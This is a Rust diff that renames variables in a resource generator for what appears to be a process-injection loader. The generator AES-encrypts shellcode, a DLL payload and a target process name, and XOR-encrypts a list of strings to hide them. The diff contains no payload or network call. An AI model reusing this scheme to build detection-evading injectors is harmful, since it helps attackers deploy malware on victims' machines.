@@ -36,34 +36,34 @@ pub(crate) struct ResourceGenerator {
 
 impl ResourceGenerator {
     pub(crate) fn new(out_dir: String) -> Self {
-        let aes_iv = generate_random_bytes(get_iv_len());
-        let aes_key = generate_random_bytes(get_key_len());
+        let aes_iv_bytes = generate_random_bytes(get_iv_len());
+        let aes_key_bytes = generate_random_bytes(get_key_len());
 
-        let target = if !TARGET_PROCESS.is_empty() {
-            aes_encrypt_bytes(TARGET_PROCESS.as_bytes(), &aes_key, &aes_iv)
+        let target_bytes = if !TARGET_PROCESS.is_empty() {
+            aes_encrypt_bytes(TARGET_PROCESS.as_bytes(), &aes_key_bytes, &aes_iv_bytes)
         } else {
             vec![]
         };
 
-        let shellcode = if !SHELLCODE_PATH.is_empty() {
+        let shellcode_bytes = if !SHELLCODE_PATH.is_empty() {
             aes_encrypt_bytes(
                 fs::read(SHELLCODE_PATH)
                     .expect("Could not read shellcode from disk.")
                     .as_slice(),
-                &aes_key,
-                &aes_iv,
+                &aes_key_bytes,
+                &aes_iv_bytes,
             )
         } else {
             vec![]
         };
 
-        let dll = if !DLL_PATH.is_empty() {
+        let dll_bytes = if !DLL_PATH.is_empty() {
             aes_encrypt_bytes(
                 fs::read(DLL_PATH)
                     .expect("Could not read dll payload from disk.")
                     .as_slice(),
-                &aes_key,
-                &aes_iv,
+                &aes_key_bytes,
+                &aes_iv_bytes,
             )
         } else {
             vec![]
@@ -71,21 +71,21 @@ impl ResourceGenerator {
 
         let strings = STRINGS
             .iter()
-            .map(|string| {
-                let key = generate_random_bytes(string.len());
+            .map(|string_name| {
+                let key = generate_random_bytes(string_name.len());
                 Strings {
-                    string_name: string,
-                    encrypted_bytes: xor_encrypt_bytes(string.to_lowercase().as_bytes(), &key[..]),
+                    string_name,
+                    encrypted_bytes: xor_encrypt_bytes(string_name.to_lowercase().as_bytes(), &key[..]),
                     offset: usize::MAX,
                     key_bytes: key,
                     key_offset: usize::MAX,
                 }
             })
-            .chain(USER_STRINGS.iter().map(|string| {
-                let key = generate_random_bytes(string.len());
+            .chain(USER_STRINGS.iter().map(|string_name| {
+                let key = generate_random_bytes(string_name.len());
                 Strings {
-                    string_name: string,
-                    encrypted_bytes: xor_encrypt_bytes(string.to_lowercase().as_bytes(), &key[..]),
+                    string_name,
+                    encrypted_bytes: xor_encrypt_bytes(string_name.to_lowercase().as_bytes(), &key[..]),
                     offset: usize::MAX,
                     key_bytes: key,
                     key_offset: usize::MAX,
@@ -94,15 +94,15 @@ impl ResourceGenerator {
 
         ResourceGenerator {
             out_dir,
-            aes_key_bytes: aes_key,
+            aes_key_bytes,
             aes_key_offset: usize::MAX,
-            aes_iv_bytes: aes_iv,
+            aes_iv_bytes,
             aes_iv_offset: usize::MAX,
-            target_bytes: target,
+            target_bytes,
             target_offset: usize::MAX,
-            shellcode_bytes: shellcode,
+            shellcode_bytes,
             shellcode_offset: usize::MAX,
-            dll_bytes: dll,
+            dll_bytes,
             dll_offset: usize::MAX,
             strings,
         }
